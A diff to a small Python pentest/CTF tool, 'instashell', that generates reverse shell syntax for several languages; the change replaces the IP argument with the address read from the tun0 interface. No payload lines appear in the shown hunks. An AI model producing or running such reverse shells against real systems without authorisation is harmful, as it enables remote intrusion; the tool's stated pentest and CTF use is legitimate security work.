@@ -1,6 +1,7 @@
 #!/bin/python3
 
 import sys
+import os
 
 # Writen by Checkn8
 # Shell syntax was taken from the Pentest Monkey reverse shell cheart sheat. 
@@ -10,7 +11,7 @@ if sys.argv[1] == "--help":
     Description:\n
     instashell generates the correct reverse shell syntax for any code platform for easy injection during a pentest or CTF.\n
     Usage:\n
-    instashell <option> <ip> <port>\n
+    instashell <option> <port>\n
     Options:\n
     -bash  Bash shell\n
     -perl  Perl shell\n
@@ -22,10 +23,10 @@ if sys.argv[1] == "--help":
     ''')
 
 # Check if valid params were passed
-if len(sys.argv) == 4:
+if len(sys.argv) == 3:
     shell_type = sys.argv[1]
-    ip = sys.argv[2]
-    port = sys.argv[3]
+    ip = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
+    port = sys.argv[2]
     port = str(port)
 
     # check the shell type
